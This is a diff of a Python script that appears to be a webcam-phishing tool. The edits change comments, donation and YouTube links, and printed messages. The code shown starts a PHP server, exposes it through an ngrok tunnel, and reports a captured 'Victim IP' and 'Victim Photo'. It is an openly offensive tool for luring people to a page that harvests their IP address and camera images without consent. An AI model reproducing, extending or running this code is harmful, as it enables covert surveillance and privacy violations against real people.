@@ -1,7 +1,8 @@
 # Coded by @INDIATECHYOUTUBE
 # Github : https://github.com/INDIATECHYOUTUBE
 # Don't copy the code
-# Donate author on paypal if use any part of the code....
+# Donate author on paypal if use any part of the code : https://paypal.me/indiatechyoutube
+# Youtube : https://youtube.com/channel/UCxwRU278xsYp3Y-QHGoMTPw
 import os
 import pathlib
 import re # pip install re
@@ -26,10 +27,11 @@ def check_ip_cam():
                 print(colored(f"[*] Victim IP : {read_IP}", "red"))
                 ip_file.close()
                 os.system('del ipfile.txt')
+                print("")
             check_ip_cam()
         if images_log.exists():
             print("\n")
-            print(colored("[++] Victim Photo Found/Catpured ", 'green'))
+            print(colored("[++] Victim Photo Found ", 'green'))
             print("")
             os.system('del images_log_info.log')
             check_ip_cam()
@@ -95,7 +97,7 @@ def yes_opt():
         os.system("start /b php -S 127.0.0.1:3333 > nul & ")
         print(colored("[+] Starting Ngrok ", 'blue'))
         os.system("start /b ngrok http 127.0.0.1:3333 > nul &")
-        print("Start this application again to run correctely, If you are using for first time OR if you close it totally")
+        print("Php is running now, open this software again without closing this running window ")
     except:
         print(colored(" : ( Something went wrong", 'red'))
         time.sleep(3)
